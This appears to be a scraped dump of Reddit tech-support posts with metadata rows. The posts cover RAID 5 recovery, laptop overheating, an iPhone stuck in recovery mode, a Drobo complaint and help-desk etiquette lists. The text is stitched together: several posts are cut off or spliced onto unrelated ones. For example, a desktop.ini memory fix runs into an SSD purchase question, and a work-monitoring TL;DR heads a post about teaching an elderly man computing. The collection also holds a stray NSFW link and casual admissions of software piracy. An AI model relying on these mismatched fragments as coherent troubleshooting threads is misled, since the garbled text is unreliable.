TL;DR: go on reddit a lot at work, they might bust me in the near future. Looking to find out more about usage monitoring. help??

A member of my community, a very nice politically active 86 y/o WWII vet, has asked me to help him learn some basic computing on his (as he says) ""rather old Dell""

He has done some other library classes that didn't stick apparently. I have done product specific tech-support over the phone before, but never general computing teaching.

I am not sure what exactly I will find or what he wants to learn to do, but I was wondering if people had any thoughts or advice? 

* I know he wants help doing email confidently

* I'm guessing he would like to get a very basic blog setup (because I know he is a politically active writer)

* Other than that, just general computer competence (web browsing, I don't even know if he has a facebook, etc)

Is there a good book that would be worth investing in so that we can do a more structured ""class"" rather than just messing around? Or any software that might help. I will be in the same room with him most of the time.

He has rather bad hearing, so more ways to show him visually would be helpful.

1349351722.0	10xjii	Click on folder, use all available memory.	ArtistEngineer	37	4	18	"Hi there, I was about to post this problem to Reddit when I solved the problem. So I thought I'd share the symptoms and the solution just in case it happens to someone else!

System specs: Windows 7 Ultimate 64bit SP1, 8GB memory, Pentium i5. 

Symptoms: Open a specific folder on desktop and system grinds to a halt. Runs very slow, stalls and starts, mouse still works, can slowly open other applications but it eventually stops all together. Same problem happens if you open the same folder from another application. i.e. to save a file. 

There is nothing special about this folder. It is just a simple folder on my desktop.

Several reboots later ... I looked at the memory usage when I just click on the folder, and it appeared that explorer.exe was using ALL the memory in my system all at once. The memory would gradually go down, but then it would get used all again.

Only way I could capture this was with a crappy mobile phone photo: http://i.imgur.com/7nIGP.jpg

I ran:

* CCleaner
* sfc /scannow
* RAM check
* S.M.A.R.T. check was OK for all drives

Everything came up clean.

I rebooted into Safe Mode, clicked on the folder, and the same problem.

Finally I rebooted into Command Prompt only mode and had a look in the folder. Turns out the desktop.ini file was 4,095,857,752 bytes in size. I deleted it and the problem went away.

**UPDATE:**

So I was researching how to do a fresh install and many people were talking about fresh installing on a ssd. I decided to look into it and realized my computer could use one. Although my primary hard disk is rated 5.4 and the computer is limited by the unchangeable graphics. But since I am going to do a fresh install anyway will shelling out $200 for a 240gb be worth the performance boost? Looking for professional opinions thanks. 

oh and I will be upgrading to 4gb of ram if that makes a difference

tl;dr is the performance of an ssd worth $200 in an acer aspire 5517?

edit: nvm there are 120gb ones for about $120 are these worth it?

If I go to a video page like [this one (NSFW)](http://xhamster.com/movies/1474658/the_girl_with_the_perfect_ass.html?embed=view), the page loads but the player just shows the ""loading"" animation.

1339352496.0	uuuvx	RAID 5 is offline...and I'm an idiot	webraft	37	7	52	"[](/solved)I decided that I wanted to try out Ubuntu on a USB drive so I installed 12.04 on a bootable USB drive. I thought it was then just a simple exercise of then booting from the USB drive via the motherboard BIOS, selecting the drive to boot via the GRUB GUI and then running Ubuntu. But after selecting to boot from the usb via GRUB, all I saw was a cmd looking screen with text that seemed to indicate some sort of issue (I also noticed the word RAID within this error text). Since the screen seemed to be frozen in this cmd state I decided to reboot the computer and boot into my usual OS. It was when the BIOS was booting up that I noticed that my three 1TB hard drives under the RAID 5 configuration were 'Offline'. Checking my drives in Windows 7, none of my RAID 5 config is showing.
***
Here is info that I thought was relevant:

**Motherboard:** Gigabyte P55A-UD4 Rev.1 (BIOS latest F15)  
**RAID 5 hard drives:** 3 x 1TB Western Digital Caviar Black (FAEX) connected via SATA 2  
**RAID driver??:** Intel Rapid Storage Technology 9.5.0.1037  
**OS:** Windows 7 Pro 64bit  
**OS hard drive:** Corsair Performance Pro 120GB SSD connected via SATA 3  
**RAID software:** Intel Rapid Storage Technology 10.8.0.1003  
**RAID controller:** Apologies, I don't know how to find what version/type it is  
**Setup:** To make it a little clearer, I have my OS installed on the SSD with all my programs installed on it. The RAID 5 configuration is used as my storage...and backup (shakes head). Luckily, my extremely important data is also backed up on dropbox (and the SSD) and a large portion of data that was on the RAID 5 has been backed up on external drives.
***
I'm assuming that because *all* my hard drives under the RAID 5 configuration are offline, that I have completely lost all my data pertaining to these disks? Is there any chance I could get it back?  The fact that I haven't done anything to the RAID 5 except try to boot Ubuntu off a usb drive makes me think that I haven't done anything to destroy the RAID 5 array, however my understanding of hard drive arrays is very basic.  
***
*Edit: I found another redditor having what appears to be the same type of issue [here](http://www.reddit.com/r/techsupport/comments/d5v0y/dumb_mistake_resulted_in_a_raid_failure_am_i/)  
On this basis, it seems I need to delete the RAID 5 array and create another one. Then I boot into Windows 7 and run TestDisk? Am I missing a step here? My only concern (other than losing my data) is that TestDisk is safe (legitimate and not malware/virus etc)? Can anyone vouch for it? I think it is also time to purchase a NAS.  
***  
My questions seem to have gotten a little fragmented, so here they are in number form:  
1) Is there a way to get my data back?  
2) If I follow the above link advice, do I delete the RAID array in the BIOS and create a new one and then run TestDisk in Windows?  
3) Is TestDisk legitimate and safe to use?  
***  
*Edit 2: Okay, I've accessed the RAID settings in the BIOS and have discovered that I am unable to either create or delete the RAID volume. The only option that seems to be available is to unmount the RAID array. Any ideas on why I can't create or delete the array?  
***
Thanks to tumadre159, I am able to see the 3 drives that make up the RAID 5 array.  
***  
Well, I think we've done as much as we can do at the moment. Now that I can actually see the 3 x TB hard drives on the OS means I can use the recovery software. As to whether I can recover the data is yet to be seen. Until then, thanks to everyone who helped out. I was genuinely impressed by the amount of helpful information from all involved.  
***  
***  
***
[](/solution)
*UPDATE: I was able to recover the data due to multiple events. Firstly, because [RAID Reconstructor](http://www.runtime.org/raid.htm) was able to find the RAID array and data, I went and purchased an external drive. I then tried to create an image file of the RAID data to the new drive with the above mentioned software, however because it is a trial version (30 days), it had restrictions...namely, creating and restoring files. I then installed the other suggested software, which was [Raid Recovery](http://www.diskinternals.com/raid-recovery/) and found that even though it also had file restrictions, I was able to create a .dsk image file of the RAID array. All I needed to 'open' this .dsk file was to use 7zip...and there was all the data, untouched.  
Once I had the .dsk file on the new 3TB drive, I decided to try and 'reset' the RAID configuration in the BIOS on the off-chance that the whole RAID situation was because of a metadata issue. Before I attempted to change the RAID config when booting up I noticed that my BIOS was showing my 3 x 1TB drive as 'online'...which meant that my RAID array was back. Booting into windows confirmed this, and all my data was easily accessible via windows explorer.  
As to why my RAID array was back online, I can only guess. I'm assuming it was because I originally changed the RAID sata connection of RAID(XHD) to AHCI so that the individual drives would be visible for the raid restoration software. Then, when I then changed the connection back to RAID(XHD), this 'restored' the proper metadata to the RAID 5 array.  
Even though the [Raid Recovery](http://www.diskinternals.com/raid-recovery/) software was used to restore the data, in my limited opinion, [RAID Reconstructor](http://www.runtime.org/raid.htm) was the better of the two due to its ease of use and layout."	t5_2qioo	True

Our backups are not nearly as current as we would like, and are attempting to mount the virtual disk to a backup so we can explore the files. This is kind of out of our personal capabilities and we are basically forced to let our database software provider help us repair the disk.

1335734678.0	syo10	Top 10 Essential Troubleshooting Tips	jmnugent	35	3	10	"I've put together a ""Top 10"" list of (what I hope are) helpful troubleshooting tips. I hope the /r/techsupport/ community finds it useful. 

If I've missed anything or you'd like to suggest tips of your own,.. please add them,.. and I'll try to dedicate some time to re-writing and adding it to the FAQ/WIKI

**1.) Gather as much diagnostic information as you can.**

Pay attention to disk activity, CPU spikes, temperatures or other info. Look in the Computers ""Event Logs"", Console Logs or other monitoring applications. The more information you have,.. the better you can search for answers. 


**2.) Google Search**

The amount of information on the Internet is staggering,.. and pretty much any problem (technical or otherwise) that you could ever possibly run into,..is documented somewhere on the Internet. 5 or 10 minutes of focused/dedicated searching is time well-spent. Even if you don't find the solution to your specific problem,.. you'll learn a few things that might help you in the future. 

**3.) Can you re-produce the problem?**

If the problem is re-producible,.. then document the steps that lead up to it. This information is IMPORTANT.. as it might contain hints as to why your problem is cropping up. (IE = Computer only crashes when I play intense video games might be an overheating issue, etc)

**4.) Isolate or breakdown the problem into smaller pieces.**
 
It's easier to troubleshoot simple problems,.. and almost all problems can be broken down or made simpler by removing stuff that doesn't matter.  This is why a lot of instructions will suggest rebooting in ""Safe Mode"" because ""Safe Mode"" is a minimal/reduced environment and helps narrow down what might be crashing. The same is true for hardware,.. if you suspect a hardware problem, remove any extra devices and/or add them back 1 by 1 until you find which one is causing the problem. 

**5.) Test with a 2nd piece of hardware.**

Testing with a 2nd piece of hardware is a really effective way to quickly isolate a problem. Swapping out keyboard, mouse, video card or network cable will tell you almost immediately if it's the component or something else. 

**6.) Test with an alternate Operating System**

There are many bootable CD's available for free on the Internet. Some are Linux-based Operating Systems like Ubuntu or Mint ,.. others are stand-alone diagnostic CD's like Hirens, FalconFour or Apple's OSX Hardware Test. Booting from one of these CD's bypasses your internal-harddrive.. and allows you to test the computer's hardware from an entirely different OS. If the problem still occurs, it's almost certainly a hardware problem. If the problem only happens when you boot to your original hard drive,.. then it's likely a software problem. 

**7.) Don't overlook the obvious.**

Sometimes problems are caused by ridiculously simple things ,... Is it plugged in correctly? Does a Reboot fix it ? Ask someone nearby to give you a quick ""2nd opinion"" just to make sure you aren't overlooking something obvious. 

**8.) Make sure everything is up to date.**

Does your system have all available software updates ? (Windows Updates, Mac OS Updates, Driver updates, Java updates, Adobe Reader/Flash updates) ????

**9.) Routine Maintenance.**

When was the last time you ran routine maintenance tools such as Disk Defrag or CHKDSK ? (Mac users look here for [Apple Maintenance Scripts](http://www.thexlab.com/faqs/maintscripts.html)). Clean up your drive with tools like CCleaner (available for both Windows &amp; Mac). 

**10.) Anti-Virus / Malware Scans.**

You should never rely on a single tool to keep you protected. It's always a good idea to scan with multiple AV/Spyware tools even if just as a 2nd opinion to make sure your system is clean. Many Anti-Virus providers have free online scanners,.. or you can use free tools like MalwareBytes, SuperAntiSpyware or other utilities. "	t5_2qioo	True

Packets come about once per second and each has 34 bytes of data, with only 2 bytes changing between each.  Within the packet is the string ""Port "".

How does one know when bottle necking will occur?

**EDIT**: Thanks everyone for all your inquiry on the subject, such a diverse array of examples was very helpful, let me try to take the ""test"" as it were and see if I got it, correct me if I am wrong.

Bottlenecking is more simple than I thought, any piece of hardware (or software) that is so poor or outdated that it restricts how well something else can perform. The example I came up with trying to make it different from others is you want to play games on ultra with high resolution so you go out and buy a GTX690, however you have an old dual core CPU clocked at 2gHz and 2GB of RAM...even though it is arguably the best GPU out now, you will still have problems running games well because the RAM and CPU are bottlenecking it?"	t5_2qioo	True

We have re-registered all associated DLLs, attempted to repair IE, verified all reg entries and still cant figure it out. Both Internal and External Sites are affected. Only way to fix it is to remove IE8 and reinstall it, nota valid solution for 750 machines with more having IE pushed to them in the near future.

Some of the machines have IE8 installed prior to SP3 and as such require that we remove SP3 before we can even touch the IE install.

Edit 1: There is nothing I can do about IE being used. It was decided longer before I came to the Company and I have no power to change the browser being used.

Edit 2: Ok so it turns out that there is a known issue with SAP Front End and IE. When SAP Front End installs/uninstalls/updates (since it has to uninstall and reinstall) it unregisters a specific service. In order to fix the issue of Blank Pages and Java Script errors you need to do the following.

Open up RUN and type in Sapregsv.exe mshtml.tlb This will re-register the service that is the cause of the issue. Close and reopen IE and...fixed!

I'm in another flat now, but i can't work anywhere really. A couple of girls from my old studio used to work from home and redirect/route their IP through something in Germany. They look on sites (i don't know how) and find out which girls/IP's are working from my country, and force you to work for them.
However, i don't know what exactly it is that i need to look for online and buy, so it shows like i'm connecting from another country.

 This doesn't really fit the parameters of what I'd call tech support, it's not so much a software problem as it is a ridiculous 'mechanical' problem.

So, laptop started overheating, I bought some cans of compressed air and got down to the business of opening up the case to clean the dust out of it.

Unscrewed all but *one* screw, the one in the middle, and found to my dismay that the 'grooves' are too wide (broken) for the screwdriver to unscrew it. (I think this is called a 'stripped' screw? English isn't my first language). Wtf? I can't really access the screw easily as it's down a hole, I can only really get to it with the screwdriver but it won't turn it. 

What can I do? I suppose I could try take a picture to show you, I don't think it'd come out very well. Is there something I can get that would let me open/fix the screw and clean my laptop? Am I going to have to send it to some PC repair shop when it's just a matter of cleaning dust from it?

*I've tried filing a groove in it for a flathead screwdriver, no luck, tried just wedging a flathead screw driver in there but still nothing.*

*I don't have a drill, so at this point it's either a case of gluing something to it and try and unscrew it, or break it off? Wouldn't that leave the screw's 'body' inside it?*

(Dear people of the future with an ASUS g50VT laptop with stuttering, low framerate, slowdown, overhating CPU, GPU, etc. this is the solution! Hopefully google indexes this and everyone can find it) 

Many thanks to everyone else for your advice and suggestions!! Shutout to expert02 as well for providing a picture of the guts!

(end of edit)

First off, [here are the temperature readings](http://i.imgur.com/1UsK2.jpg)

**My system information:**

[ASUS G50VT](http://www.asus.com/Notebooks/Gaming_Powerhouse/G50Vt/#specifications) (2.26 GH dual core processor)
I purchased the system at Best Buy at the start of 2009. Since then, I have installed windows 7 OS after reformatting the drive completely. All drivers are up to date, and idk if this is relevant, but the system has trouble detecting that the disc drive is connected to the system (which I suspect is from the connections wearing out).

**Problem Description:**
My computer overheats rapidly whenever I play a video game. The temps I posted were from having minecraft open in the background (vanilla minecraft with max settings and default texture pack) and my web browser (Chrome) open with 1 tab. The problem does not exist when I am not running a game (it appears to be linked to the graphics card)

**Attempted Solutions:**

**1.** This has happened to me before and I solved the issue by cleaning out the inside of my laptop. I removed the back case and used compressed air to clean out the fan and all accessible areas. There is still some dust on the fan that I could not remove but the level of dust is not significant enough to restrict airflow or produce heat through some other means.

**2.** I searched many forums online for similar problems and found some who said the the heat sink may have become detached from the locations where it needs to maintain contact to work properly. I had the help of my buddy who works on avionics for jet fighters and he said my heat sink was very bizarre looking (it is a long, golden bar that snakes around the computer making contact with the GPU and processor, or so I assume). He verified that it was connected in all obvious places and I made sure to tighten all the screws. This did not solve the problem.

**I can provide pictures of the inside of my laptop if requested, or any other information that is needed. For reference, I am studying Software Engineering at University, but I am unfamiliar with the details of the hardware of the computer.**

Even after clearing browsing history...	shitty_breathMore	35	5	47	"I noticed that when I use Firefox, all google ads are very related to online purchases that I have made recently. In other browsers, google ads are random. 

The story:
Last week I bought a toy airplane on hobby king dot com. Now whenever I view a webpage that has google ads, I see an add related to r/c aircraft. I have cleared my browsing history and restarted my machine, still all google ads that appear in FF are related to an interest in r/c aircraft. 

These ads don't show up in Opera nor Safari. 

Does anyone know how this is happening? What is it about FF and google ads that makes recognition of my preferences 'unshakable'?
Although the ads are very well targeted (I nearly bought something as a result of clicking) I would like to know how to stop this. 

Thanks

Long story short, I use Teracopy for my copying needs.  I was copying the data from the source HDD to another external HDD (in hopes of one day avoiding this very issue), when I cancelled the job because I was going to let it run overnight.  After the cancel, I selected ""Delete"" from Teracopy, ASSUMING it was deleting the copied files from the DESTINATION drive.  NOPE.  It deleted them from the source drive.

Of the 400 GB of data, I have only 40 GB remaining.

These data were broken up into 10 or so folders, most of which has 3 or so sub folders.

Due to the nature of the data, I cannot say what they were, but will say that they are VERY large files.

I've tried to use EASEUS Data Recovery Pro on the drive - it finds 400 GBs of data, but the data is in jumbled format - no intelligent names, and the file extensions don't even seem right.  It's imperative the files be of a certain name, and in their specific folder in order to work properly.

I think, basically, all that happened was the files were deleted from the partition table (I think thats the lookup table NTFS uses right?).  Anyway, if i could somehow get the old table back, I think I would be golden.

Nothing has been written to the drive since the ""accident"" occurred.

Can anyone provide any assistance?  Know of a tool I can use to get me out of this heaping pile of shit I'm under?


**Edit/Update:**  Wow, thanks for all the replies guys.  Going through each of them one by one (starting with free solutions first). TestDisk was unable to locate the deleted files - actually, it found ONE (of the 10 or so I  REALLY need), but it showed as having 0 Bytes.  Again, these are large files, around 20GB each.

They JPEGs seem to monitor all my activities on the browser (Chrome).

More alarmingly I recovered screen shots of text messages between me and selected people (with whom I text the most). I have never synced my iphone 4S with this laptop and it has only been connected to it for charging. I also recovered screen shots of my ipad (again only connected for charging and never synced)

Some of the screen shots contain very sensitive data and I would not be happy if this ends up in the hands of anyone. I know of a dictatorship that would have reason to monitor my activities. I was hoping if someone could tell me how and why this is happening to me.

The recovery software I used was Stellar Phoenix Photo Recovery. "	t5_2qioo	True

1361743296.0	195j9e	Is it possible to add a second (or third) monitor to Windows over a network?	davesss	33	4	19	"Here's my setup:

I have a desktop running Windows 7 with two monitors, then across the room I have a TV that has a laptop running Windows 8 connected to it.  I use my Android phone and the Universal Remote app to control the mouse/keyboard on the laptop/TV.  The laptop is connected to my home network via WiFi, and my desktop is wired directly to the wireless router.

However, I think it would be a better media experience if I could simply use the TV as a third monitor on my desktop.  That way, I could play games that my laptop can't handle.

I have looked into this a bit, but wasn't able to find a great solution.  I tried Air Display, but it was laggy and just opened up into another window on my laptop, not allowing me to use full screen.

Does ethernet just have too much latency to make this a realistic possibility, or is there a better solution I have not yet discovered?"	t5_2qioo	True

1359814519.0	17r4j5	iPhone 4S bricked after 6.1 update - iTunes errors 21/1611	99_Problems	43	12	30	"Yesterday my iPhone 4S asked me to install the iOS 6.1 update (over the air). After downloading and preparing the update, the iPhone rebooted itself to start the update process.

Unfortunately, this is where it all went wrong. It seems like the iPhone update failed somewhere along this process. It is now stuck in ""Recovery Mode"", with the picture showing me to connect the phone to iTunes.
 
I have tried countless times restoring the phone via iTunes, on 4 different computers, and on Windows and OS X.
Nothing works. The restore process fails during the ""Preparing iPhone"" phase.
 
Here's what happens every time:

1. I can see the phone being restarted.
1. The Apple logo shows up, and a little wheel in the bottom of the screen starts spinning
1. As soon as (usually even before) the progress bar shows up on the phone, the device suddenly shuts down
1. The iPhone reboots right back into recovery mode, asking me to connect to iTunes
 
I'm quite desperate at this point. I have followed all steps imaginable (including turning off Windows firewall and antivirus software) through hours of troubleshooting, but even then the restore still won't complete. iTunes always gives me the same error: 1611.

When putting the phone into DFU manually to restore, iTunes gives me another error: 21.
Both seem to point to third-party security software interfering with the restore process.
However, having tried this on 4 different computers, I am 99% sure that this is not the issue. So far I've tried this on:

* HP Laptop - Windows 7
* Desktop (own build) - Windows 7
* 2010 Macbook Pro 15"" - OS X Mountain Lion + Windows 8 (Bootcamp)
* 2010 Macbook Pro 13"" - OS X Mountain Lion
 
Finally, I should mention that in Belgium there aren't any official Apple Stores where I can book an appointment at a Genius Bar. Is this 4S doomed?

EDIT: Thanks to everyone responding to my thread. Guess I'll have to go through Groupon (where I bought it from) to get it repaired/replaced under warranty. Groupon doesn't exactly have the greatest reputation when it comes to customer service though, so hopefully I can get this sorted out without further issues :-/"	t5_2qioo	True

Retsejme	42	8	88	"Here's the thing, back in '99 or so my virus protection program (I *think* it might have been Mcaffe) would do so many stupid updates that it started feeling like I was bogged down by a virus.  It interfered with my Starcraft tower defense games, so I nuked it.  

Then I thought: who is actually going to target me? If I don't download crap from people I don't know, I should be fine.

Here's the funny part, I actually engaged in risky behavior. Remember Warez sites?  Well, I ... uhh... ""evaluated"" quite a few things. I wanted to check out new OSs, Photoshop, etc. Never got a virus. Built a few more boxes since then, still don't have one. People say I'm crazy, but I know people with virus protection that have gotten viruses.  

I figure your activity is more important than your system. However, I'm aware that the world is changing, and I am open to having my mind changed as well.

So here's my question: How crazy am I (on a scale of Michelle Bachman to current day Robin Williams - aka ""destructively nuts"" to ""weird but harmless"")?

Follow up question: If I am stupid crazy should I use MSE? That's what everyone says for win 7 right?

1353523475.0	13ku4m	Why is my laptop suddenly about as responsive as a pregnant yak on crutches?	Fucking_Computers	45	16	19	"Dear people who know more about computers than me,

I've had my current laptop for a little under a year. It's a HP Pavilion dv6 running 64-bit Windows 7, i5-2430M @ 2.40Ghz with 6GB RAM. Not exactly the slickest machine on planet Earth, but it's been entirely acceptable and run very smoothly until now.

A few days ago I decided I would devote more time to the things that really matter in life, so I got Football Manager 2012 up and running again. Haven't played it for a couple of months - it always ran absolutely fine; no performance issues whatsoever. I noticed as soon as I got going with it again that it was being pretty unresponsive in the in-game menus. I would click on something and there'd be a half second delay before anything happened. Similarly, when scrolling through the news items in my virtual in-game inbox, I would experience a lag when moving from one item to another.

Not a huge deal, but annoying, especially considering that it had been working great. Everything seems to be functioning with this slight lag. For example, when using the arrow keys to scroll through pages in Firefox I'll get a little delay in response.

I'm not an elite hax0r by any means, but I'm not quite as useless as, for example, my mother. I run CCleaner very regularly. To the best of my knowledge, I've kept startup operations to a minimum. I don't have Bonzi Buddy. I got rid of Norton 360 and replaced it with MSE. I even reinstalled my beloved Football Manager to see if that would help. It didn't.

Do any of you knowledgeable people have any idea what might be causing this and how I might be able to fix it? If so, I'll reward you with some of my prize-winning swedes. Or at least, I would if I had some.

Thank you.

I had some time to kill so I got out my netbook and my phone and loaded up the wifi tethering so I could use my phone's internet on my computer.

Here are some of mine:

* Always overbid a job by a little. It will give you some room to mess up and if you feel bad about it at the end of the job just discount the overbid amount - Customer is happy, you are happy :)

* Resell software like Malware Bytes and Anti Virus instead of making them buy it direct. Any other softwares that don't require renewal (Office, etc) I generally mark up about 10%. You can also resell online backup solutions.

* Word of mouth is your best friend; always go out of your way to make your customer happy. A $100 loss now could mean a new client later on; on the same token angering a customer for $100 could mean a loss of potential clients.

* Get a decent remote support software (I use LogMeIn Rescue, it's expensive as hell but I love it - call and ask for a discount though :D). I give my customers a discount when I can work from home. I save gas, them staring over my shoulder and the trouble of putting on pants and they save some green.

* Get a good set of tools. The one on ThinkGeek isn't bad (but it is overpriced).

* Get a netbook with a good amount of RAM. So much easier to carry around than your bulky laptop.

* Get two flashdrives 8GB+. Put the apps that you should use on service calls on one, and use the other for moving documents should you need it. No reason for your service flash drive to get a virus.

* Try to sell service contracts to customers with 5 or more computers. I sell service contracts for $20/computer/month - this includes free remote support. I give them a discount on on-site visits should it arise. It keeps your clients from forgetting about you. Since I started doing contracts I've been getting a lot more calls from customers and definitely make back the difference. Plus, there are quite a few things (bad viruses, network issues, reformatting) that can't be done remotely anyway. Instead of opening the phonebook they will pull out your business card.

* When trying to start with a new customer, talk to the secretary. They are the key. I like to only talk to the secretary. ""This is Synth3t1c with MyCo, who am I speaking with?"" ""This is Cheryl."" ""Hey Cheryl, I want to start off by saying I am not selling you anything today, not putting you on a mailing list and not offering you a free trial. MyCo is an IT company, and we are expanding our business in YourCity. I would like to send you a coupon for a free service call - no hidden fees associated with it at all.

1279212583.0	cpy4u	PSA to anyone with calling tech support: 12 Rules for Calling Computer Tech Support	LunacyNow	36	5	20	"Here are a few tips that I'd like to share with reddit that might help smooth over any calls they place to a computer tech support helpdesk. These rules refer to the most common culprits who call the helpdesk. Keep in mind that this focuses on the call centers that hire those with good communication skills. Tech support from those who do not speak your native language is a *whole* other issue.


12 Rules for Calling Computer Tech Support

* 1) We not here to listen to you complain.

We know there is a problem, that's why you are calling, obviously. Huffing and puffing and complaining are not conducive for us being helpful. Making the call longer means it takes longer to resolve the issue. The facts ma'am, just the facts. Figure out another method of stress relief other than calling the help desk.

* 2) Call when the issue is happening.

Many people call just to tell us something happened 2 weeks ago, or are afraid a previous issue might return. It's difficult to troubleshoot something that is not broken and functioning properly. Don't hesitate to call. Many people call us after an hour or more of trying to fix something on their own that could have been resolved in 5 minutes or less. Don't frustrate yourself.

* 3) We ask you questions for a reason: We're not sitting next to your computer, can't see what is going on, and we're not mind readers.

The questions might sound rudimentary, but we are following logical, step-by-step process to isolate the issue. And although you might have already tried the basics, there's an amazing amount of idiots that call us. Please keep that in mind when we ask something seemingly silly like if your computer is plugged in. Even smartest people tend to overlook the simplest things. Tell us what ever you think is relevant. If you don't tell us anything, it make our job very difficult to help you. More information is better than no information.

* 4) We give specific instructions for a reason.

Please just listen to what we have to say. Don't start clicking options, pressing buttons, or opening windows that we did not tell you to. You're just making the call longer and possibly doing some harm. Know what a 'Start' button is, the difference between right-click/left-click, where the power button is,  etc... (see rule # 6).

* 5) Don't argue with us about the troubleshooting.

If we ask you to do something, don't tell us that's it's not going to work before you try it. You would be surprised how many calls we get that are known issues with specific fixes. We get tons of repeat calls and fix the same issues repeatedly. Many people who call just argue only to then try what we ask then see it work. We know most of what works and what doesn't. If you think you know better, then why did you call us for help in the first place?

* 6) We know that you a lot of you are not so tech-savvy... but there are some limits.

First of all, there's no need to tell us you're not tech-savvy, it's just annoying when people say that. Secondly, if we ask you something like whether you are plugged with a network cable or wireless and you don't know, it makes it very difficult to help you. We can only simplify things so much. You're either plugged in or not. Read instructions or online help before you call. Put in a little effort to educate yourself about the product. There's a big difference between lack of experience and lack of common sense. The people that are always most easily frustrated when they call are those who know absolutely nothing about computers and make no effort to understand them. Don't pretend to know what you're talking about if you don't. Throwing technical terms out there when you have no idea what they mean is extremely counter-productive. Common offenders are: 'the network', 'my server', and 'the harddrive'.

* 7) Reboot before you call.

On average, 35% of our calls are solved by rebooting. Reboot, grab a coffee, and if it's not working then call us. One thing that some callers do is call us and if there is any hold time, they reboot during the wait. Both hardware and software issues included.

* 8) When you call, make note of any prompts to press, extension #'s, direct lines, names and ticket/tracking #'s.

We deal with lots of people and any information you have for us is very helpful when you call in. If you get a ext # or direct dial, use it. This could save you a lot of time especially if you have to call in again. When we asked who you spoke with and you just say, 'another tech', that's not very helpful. When people mention a name, we can go to that person and get first hand information about the issue.

* 9) Remember there's only so much that we can do.

Computers are just machines and all machines break at some point. Plan on it breaking tomorrow and have a contingency plan. Don't save all of you important documents to your C: drive. Repairs take time and can't happen immediately. Sometime things break beyond repair. If you use a computer for business, have another process in place or a back-up computer ready just in case. Again, the more you understand about the product, the more real your expectations can be about getting it fixed (see rule # 6).

* 10) Remember we are human.

If you are nasty to us, don't expect us to help you. There are things we can do to make your life difficult and prolong the process of getting your system fixed (and maybe not fix). People can be assertive and be nice at the same time. There are scores of calls that we received from very nice people that we have gone above and beyond for. And of course, we do make mistakes too. We are under constant pressure to resolve as many calls as possible and get calls out of our queues quickly. Although not a prestigious job, it is still difficult and requires a lot of patience. If you don't believe me try it yourself.

* 11) Two people you should never lie to are your doctor and your tech support agent.

Don't lie. If you break something, press the wrong button, or uninstall something that caused your problem, then tell us. Everyone makes mistakes and not telling us the truth in these cases makes out job much harder to help you.

* 12) Have time set aside.

Don't call 3 minutes before you have an appointment or conference call. We'll both be frustrated if we try to fix the issue. Know that troubleshooting can take a while.

Sorry this is hard to describe and I have no idea how to search this on Google. Needless to say I'm confused about the problem. But we just got an HD Smart TV (I think Samsung). Anyway, I plugged my phone into the TV via USB and played episodes of Game of Thrones and Black Mirror. They are in HD (not sure of exact quality).

But anyway, yeah, the shows don't look like TV shows, they look like if I got friends together and put makeup on them and started recording on my personal HD camera. Is this literally what HD really is? I've seen HD before though for years now... never owned my own HD tv, but I've watched stuff in HD elsewhere. This seems like a different problem. Does anyone have ANY IDEA what I'm talking about and ANY INSIGHT to clear up my concern here? Are there settings to kill quality or change the quality for TV's like this? 

I mean I know HD brings out this kind of quality of clear picture... but is it really at the sacrifice of making a TV show look ridiculous? I feel like I either don't understand the problem here, or, I'm looking at it from the wrong angle. Or both. Probably both. I have no idea but I just want to watch my shows without thinking how ridiculous they look, and I'm not sure if the HD is the primary reason... I'm rambling now, I'll obviously be glad to elaborate or expound if need be. Just want some advice. Thanks.

1344595214.0	xzofn	Living the Nightmare! or, Life with a fucking Drobo	jaredcheeda	42	9	38	"Here's how YOU TOO! can live your life in a more inconvenienced, annoying, fearful way. All you need to do is buy yourself a *Drobo!*

For those unfamiliar, ""Drobo"" is a device made by Data Robotics designed to make data redundancy super easy. In theory it would be great, if it didn't suck so much fucking ass.

Here's what you can expect with your new drobo! A life altering event!

1. You'll quickly learn to turn of Windows Updates, as those will cause restarts, and with your new drobo, restarting your computer will now take you 45-60 minutes! Hooray! Enjoy living in fear of having to ever restart your computer.
2. Oh, but that hour of waiting around watching a black screen wasn't for nothing. Once it's done and allows windows to load, you'll have the pleasure of knowing that the drive won't even be accessible. That's right! Your drobo dashboard, you know, those extra processes running all the time in your taskbar, will almost never actually detect that the fucker is connected. Swell!
3. But no worries, a sure fire fix is to put your data in mortal danger by removing all the hard drives, waiting 10 minutes, then reinserting them and waiting 2 hours before the blinky lights on the front verify that they're hard drives and not ham sandwiches. Then you'll have access to your data! OR it might wipe the drives, who knows!
4. Now that you've spent yet another day waiting on the drive to actually work, it's time to copy some data over to it. What's that? it's over 1 gig, well have fun waiting on it to crawl at 20 KB/s transfer speeds. Surrrrre it started out at 50 MB/s, but it sure did slow down to a crawl fast. And it just drips away. Of course you could wait 20 minutes and surprise attack it with a new transfer, see how long it'll let you get away with respectable speeds before dying down to a slow drip.
5. Ahhhhh, so you want to call Tech Support for your new device. Good news! they don't know what they're doing, make you jump through lots of hoops running inconsistent, poorly made diagnostic tests, and ultimately tell you the performance you're getting is to be expected. Super wonderful!
6. Watch as the drive randomly disappears, for no reason at all! Boy howdy that's a great feature, you know how you wanted to get that file real quick. Yeah, better start watching a movie, you've got to unplug and plug the drobo back in, that's gonna take a while. Maybe make it a double feature.
6. Your life simply isn't complete without a drobo. Enjoy the whirring sounds of the non-stop fan on the back of the drobo, just because you can't actually use the thing, and it's sitting there doing nothing, doesn't mean it's fan should stop running. Nope nope nope, it's gotta spin AT LEAST 90% of the time it has power. Wouldn't be efficient for it not to.

How did I live without this marvelous device. Sure am glad I dismantled my external hard drives to put them inside of the drobo. That was a great decision. Not regretting that at all. Sure has been a fun year or two with this thing. Time flies when you have a drobo! And spend all your fucking time trying to get it to work :)"	t5_2qioo	True

The other will not boot at all if it is cold, so it has to be left on at a flashing cursor for about an hour before it will boot to windows.

1334761725.0	sg37u	What Rights Do I Have Here [UPDATED]?	throwitaway098	35	7	17	"I was asked for a followup on what happened, so here it goes:

Everything is going to be okay. The IT folks didn't share the details of the copyright infringement with my boss, I explained to them why I hadn't received a notice prior (and they believed me), and they ended the meeting by simply expressing their concern of continued activity. They told me that all four messages sent were not just DMCA take-downs, but were SETTLEMENT notices. However, there is nothing traced to my name, the University hasn't been subpoenaed in five years, and I fervently denied that the activity was mine (and it actually wasn't mine!).

